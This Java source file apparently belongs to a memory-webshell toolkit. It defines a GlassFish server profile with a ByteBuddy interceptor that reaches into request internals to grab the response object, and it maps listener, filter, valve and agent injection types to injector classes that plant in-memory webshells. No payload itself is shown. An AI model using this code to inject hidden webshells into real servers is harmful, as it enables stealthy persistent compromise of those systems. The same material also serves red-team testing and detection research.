package com.reajason.javaweb.memshell.server.glassfish;

import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import com.reajason.javaweb.memshell.server.tomcat.Tomcat;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/12
 */
public class GlassFish extends AbstractServer {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "request"), "response");
            } catch (Exception e) {
                try {
                    response = ShellCommonUtil.getFieldValue(request, "response");
                } catch (Exception ee) {
                    // glassfish7
                    response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "reqFacHelper"), "response");
                }
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishFilterInjector")
                .addInjector(VALVE, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishValveInjector")
                .addInjector(JAKARTA_VALVE, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishValveInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterChainAgentInjector")
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatContextValveAgentInjector")
                .build();
    }
}
